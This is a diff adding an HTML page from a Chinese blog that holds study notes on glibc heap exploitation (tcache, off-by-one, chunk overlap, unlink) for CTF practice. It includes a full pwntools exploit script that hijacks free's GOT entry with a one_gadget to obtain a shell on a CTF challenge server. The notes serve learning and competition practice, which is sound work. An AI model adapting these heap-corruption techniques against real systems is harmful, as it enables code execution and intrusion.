@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>堆利用笔记 | hash_hash的博客</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">hash_hash&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/friend">Friends</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">hash_hash&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/friend">Friends</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6;    // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function () {
+            tocbot.refresh(obj_merge(tocbot_default_config, { hasInnerContainers: true }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function () {
+        tocbot.init(obj_merge(tocbot_default_config, { collapseDepth: 1 }));
+    });
+
+    function expandToc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, { collapseDepth: expanded ? 1 : DEPTH_MAX }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">堆利用笔记</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 4, 2022&nbsp;&nbsp;22:27:03</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Pwn/">Pwn</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>属于是打完国赛，pwn的学习又停摆了，这个暑假还是得干点事情，不能像上个寒假不知不觉就摆过去了</p>
+<p>这里记录一下堆的常见利用方式，实在是太多了😢，大多数是参考的<del>(抄的)</del>wiki和其他大佬的博客</p>
+<h2 id="glibc源码"><a href="#glibc源码" class="headerlink" title="glibc源码"></a>glibc源码</h2><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4193">在线源码</a></p>
+<p><a target="_blank" rel="noopener" href="http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc源码分析-华庭</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">how2heap</a></p>
+<p>由于libc版本迭代会加入一些新的机制有时候需要阅读glibc源码来了解</p>
+<h3 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h3><p>glibc2.26后引入，目的是提高性能，导致了更多的利用方式</p>
+<h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+
+<p><code>tcache_entry</code>用于链接chunk的结构体，其中包含一个next指针，指向入口处的chunk</p>
+<img src="/2022/07/04/%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/pic1.png" class>
+
+<p>tcache中的存取通过tcache_put和tcache_get来进行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即从tcache里存取操作都是对entry的next指针进行修改来获取对free chunk的定位</p>
+<p>到了glibc2.29的tcache加入了标记key，在free的相关操作中可以根据key对double free进行检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>与其他四种bin不同的，tcache中的fd指针指向数据区而不是<code>prev_size</code>段</p>
+</blockquote>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Off-by-one"><a href="#Off-by-one" class="headerlink" title="Off by one"></a>Off by one</h3><p>单字节溢出，基于linux堆的off by one漏洞利用起来并不复杂并且威力巨大</p>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
+<li>溢出字节为可控任意字节，修改大小造成块结构间的重叠</li>
+<li>溢出字节为null，清空<code>prev_in_use</code>位，之后可使用unlink处理</li>
+</ol>
+<h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h4><ol>
+<li>写入时循环次数多1</li>
+<li>strcpy拷贝会多出\x00，造成off by null</li>
+</ol>
+<h4 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h4><p>uuu大佬博客上推的ctfshow上的<code>吃鸡杯-ezheap</code>，打了一下午，新装的kali不错hh</p>
+<p>利用off by one打堆重叠，构造uaf打got表，改free_got内容为og</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hash-hash/pwn/tree/main/heap%20learning/ctfshow-ezheap">附件</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">se=<span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea=<span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl=<span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla=<span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru=<span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32=<span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg=<span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28182</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ezheap&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line"> sla(<span class="string">&#x27; :&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,cont</span>):</span><br><span class="line"> cmd(<span class="number">1</span>)</span><br><span class="line"> sla(<span class="string">&#x27;how big is the nest ?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> sla(<span class="string">&#x27;what stuff you wanna put in the nest?&#x27;</span>,cont)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line"> cmd(<span class="number">4</span>)</span><br><span class="line"> sla(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cont</span>):</span><br><span class="line"> cmd(<span class="number">2</span>)</span><br><span class="line"> sla(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> sea(<span class="string">&#x27;what stuff you wanna put in the nest?&#x27;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"> cmd(<span class="number">3</span>)</span><br><span class="line"> sla(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">og=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x31</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;free_got&#x27;</span>,elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Decorations : \n&#x27;</span>)</span><br><span class="line">free=uu64(ru(<span class="string">&#x27;\n&#x27;</span>))*<span class="number">256</span>+<span class="number">0x50</span></span><br><span class="line">lg(<span class="string">&#x27;free&#x27;</span>,free)</span><br><span class="line">libcbase=free-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">onegadget=og[<span class="number">2</span>]+libcbase</span><br><span class="line">lg(<span class="string">&#x27;onegadget&#x27;</span>,onegadget)</span><br><span class="line">edit(<span class="number">3</span>,p64(onegadget))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Chunk-extend"><a href="#Chunk-extend" class="headerlink" title="Chunk extend"></a>Chunk extend</h3><p>由于ptmalloc是通过chunk header的数据判断chunk的使用情况和对chunk前后块的定位，所以可以通过改写size和prev_size的值来越块操作</p>
+<p>在ptmalloc中堆的定位通过size和prev_size进行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P(b_chunk)=P(chunk)-P(chunk)-&gt;pre_size;</span><br><span class="line">P(f_chunk)=P(chunk)+P(chunk)-&gt;size;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>overlapping(改大size域，free时会把对应size大小的chunk给free掉，导致uaf漏洞)</li>
+<li>合并操作(当free掉一个不属于fastbin范围的chunk时，会先向低地址判断是否合并，再向高地址判断是否合并。比如可以构造A-B-C三堆块，把A给free再通过一些溢出之类的操作改掉C的prev_size和prev_inuse位达到在free C时合并AB的目的，相当于造成了B的uaf)</li>
+</ul>
+<h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><p>即双向链表中的解链操作，一般不会发生在fastbin上</p>
+<p>在上面的合并操作过程中，最后会有unlink操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">// p 为被 free 的 chunk，上面的例子里是 smallbin2</span></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       <span class="comment">// prevsize 为 chunk p 的 prev_size 位填写的数据，例子中我们把它扬成了 0</span></span><br><span class="line">     prevsize = prev_size (p);</span><br><span class="line">       <span class="comment">// size 增加对应的大小，后面 set 的时候要用到 size 定位</span></span><br><span class="line">     size += prevsize;</span><br><span class="line">       <span class="comment">// 通过 -prevsize 找到低地址的 chunk</span></span><br><span class="line">     p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">       <span class="comment">// 执行 unlink 操作</span></span><br><span class="line">     unlink(av, p, bck, fwd);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 高地址的下一个 chunk 不是 topchunk 的话，将它的 prev_inuse 位设为 0</span></span><br><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">       <span class="comment">/* unsortedbin 入链操作*/</span></span><br><span class="line">       <span class="comment">// bck 是 unsortedbin 链表头</span></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">       <span class="comment">// fwd 是 unsorted 最近加入的 chunk</span></span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">       <span class="comment">// 链表为空则报错</span></span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">       <span class="comment">// p 变为最近加入的 chunk，fd 指向先前这个位置的 chunk，bk指向链表头</span></span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">       <span class="comment">// 如果不属于 smallbin 范围，还要把 size 相关指针置空</span></span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">// p 变为最近加入的 chunk，链表头的 fd 指向它</span></span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">       <span class="comment">// 原先的 chunk 现在变成 次 最近加入的 chunk 了，bk 指向最近加入的 chunk</span></span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line">       <span class="comment">// 设置 chunk p 的 size 和 prev_inuse 位</span></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">       <span class="comment">// 修改 chunk p 下一个 chunk 的 prev_size 位</span></span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>即我们在free掉一个chunk时对前后检测若满足合并条件，我们需要对合并前处在后面的堆块进行unlink操作，去修改它的nextchunk的bk指针，以及prevchunk的fd指针，如果我们在free前能够修改该chunk的fd和bk就差不多能实现任意地址读写</p>
+<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>unlink的经典图示</p>
+<img src="/2022/07/04/%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/pic2.png" class>
+
+<p>一个构造，fd&#x3D;target _addr-12 ; bk&#x3D;expect value</p>
+<p>于是unlink过程变为了</p>
+<blockquote>
+<p>FD&#x3D;P-&gt;fd&#x3D;target _addr-12</p>
+<p>BK&#x3D;P-&gt;bk&#x3D;expectvalue</p>
+<p>FD-&gt;bk&#x3D;BK&lt;&#x3D;&gt;*(target_addr)&#x3D;expectvalue</p>
+<p>BK-&gt;fd&#x3D;FD&lt;&#x3D;&gt; *(expectvalue +8)&#x3D;target_addr-12</p>
+</blockquote>
+<p>所以为了实现上述过程我们还要确保expectvalue +8的具有写的权限(上述过程为32位下，64位改相应偏移即可)</p>
+<p>上述是在unlink没有相应检测的情况下，而且是很早期的版本，所以基本都得绕检测</p>
